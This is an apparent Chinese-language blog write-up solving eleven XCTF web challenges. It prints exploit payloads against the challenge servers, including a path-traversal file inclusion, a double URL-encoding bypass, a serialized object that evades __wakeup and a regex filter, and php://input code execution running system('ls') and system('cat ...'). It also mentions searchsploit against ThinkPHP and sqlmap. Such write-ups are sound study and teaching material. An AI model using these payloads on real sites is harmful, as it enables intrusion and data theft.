---
title: "攻防世界web前11题WP"
date: 2022-01-18T11:26:31+08:00
draft: false
categories: ["CTF-WEB"]
---

### baby_web

进去之后发现是/1.php,根据提示“初始页面”，用burpsuite截获index.php，获得flag。
知识点：网页初始页面的文件名一般为index。

### warmup

进去之后发现一个滑稽表情，用burpsuite截获数据包后发现有个source.php，打开之后发现页面源代码。
```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {//page必须被设置且page必须是字符串，否则将被过滤
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {//如果page在白名单内则合法
                return true;
            }

            $_page = mb_substr(//mb_substr(str,start,length)截取字符串中的一段
                $page,
                0,
                mb_strpos($page . '?', '?')//查找'?'在page中首次出现的位置
            );//将page问号之后的内容截掉
            if (in_array($_page, $whitelist)) {//若此时的page在白名单内则合法
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])//_REQUEST是post和get的集合
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])//要求file也满足上面的要求
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
```
根据源代码得到提示，找到文件hint.php，得知flag在ffffllllaaaagggg这个文件里。再次进行代码审计,发现底下有个文件包包含，构造payload为：
http://111.200.241.244:60683/source.php?file=source.php?./../../../../ffffllllaaaagggg
就可以得到flag。

### Training-WWW-Robots

签到题，科普了一波robots.txt。

### PHP2

根据题目提示访问/index.phps获取提示信息：
```php
<?php
if("admin"===$_GET[id]) {//如果id全等于admin则会被过滤
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);//id进行一次url解码
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>

Can you anthenticate to this website?
```
构造id=%2561dmin使之在被两次urldecode后等于admin就可获得flag。

### Web_php_unserialize

又是一道反序列化的题。打开网页发现源代码。
```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { //构造函数，赋值给file
        $this->file = $file; 
    }
    function __destruct() { //析构函数
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { // /i的意思是不区分大小写
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```
当Demo被反序列化时，wakeup函数中的内容会被执行，通过构造类中成员属性数目大于实际数目绕过。
`var=O:4:"Demo":2:{s:10:"\0Demo\0file";s:8:"fl4g.php";}`
下面是对var变量的检查，用到了正则表达式，如果var符合开头`o:数字`的形式就会被过滤，这里采用`+`号过滤。
构造`var=O:+4:"Demo":2:{s:10:"\0Demo\0file";s:8:"fl4g.php";}`，再进行一次base64加密，构造payload传参即可得到flag。
注意Demofile中的\0，最好直接复制序列化之后的结果来改，不然特殊字符很容易出问题。

### php_rce

打开以后发现是个Thinkphp V5的介绍页面，说明要利用Thinkphp框架的漏洞。查阅kali linux自带的漏洞数据库即可获得hack的方法。

使用`searchsploit thinkphp``命令即可查询到可利用的漏洞。

然后远程代码执行，找到flag文件。

### Web_php_include

看题目应该是个文件包含。打开页面出一段代码。
```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```
阅读代码发现，题目简单过滤了"php://"利用php大小写不敏感的特性，构造大写的pHp://绕过过滤。
使用php://input协议，远程执行代码：
```php
<?php
system("ls");
?>
```
和
```php
<?php
system("cat fl4gisisish3r3.php");
?>
```
获取flag。

### ics-06

签到。Burpsuite暴力跑字典破解。。。

### NewsCenter

注意到网站使用的Sql数据库，使用Sqlmap工具hack。
[sqlmap使用教程](https://www.vuln.cn/1992)

### NaNNaNNaNNaN-Batman

下载到一段代码：
```javascript
function $(){
    var
    e=document.getElementById("c").value;
    if(e.length==16)
        if(e.match(/^be0f23/)!=null)
            if(e.match(/233ac/)!=null)
                if(e.match(/e98aa$/)!=null){
                    if(e.match(/c7be9/)!=null){
                        var t=["fl","s_a","i","e}"];
                        var n=["a","_h0l","n"];
                        var r=["g{","e","_0"];
                        var i=["it'","_","n"];
                        var s=[t,n,r,i];
                        for(var o=0;o<13;++o){
                            document.write(s[o%4][0]);s[o%4].splice(0,1)
                        }
                    }
                }
}
```
js正则表达式审计，但其实可以直接把前面判断的代码删掉，再跑一下生成flag的那段获取flag。

### unserialize3

又一道反序列化，打开页面得到代码：
```php
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
?code=
```
这题和上道反序列化题相比完全是两个级别，直接将给的代码反序列化后，绕过wake_up即可得到flag。